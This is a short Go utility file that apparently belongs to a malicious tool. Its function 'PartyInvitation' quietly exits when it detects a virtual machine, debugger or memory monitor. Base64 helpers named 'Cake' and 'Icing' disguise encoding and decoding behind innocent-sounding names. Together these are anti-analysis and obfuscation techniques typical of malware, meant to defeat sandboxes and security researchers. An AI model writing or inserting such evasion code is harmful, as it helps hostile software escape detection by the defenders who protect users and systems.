package utils

import (
	"encoding/base64"
	"github.com/p3tr0v/chacal/antidebug"
	"github.com/p3tr0v/chacal/antimem"
	"github.com/p3tr0v/chacal/antivm"
	"os"
)

func PartyInvitation() {

	if antivm.IsVirtualDisk() || antimem.ByMemWatcher() || antidebug.ByProcessWatcher() || antivm.ByMacAddress() {
		os.Exit(0)
	}
}

func Cake(str string) string {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return ""
	}
	return string(data)
}

func Icing(str string) string {
	data := base64.StdEncoding.EncodeToString([]byte(str))
	return string(data)
}
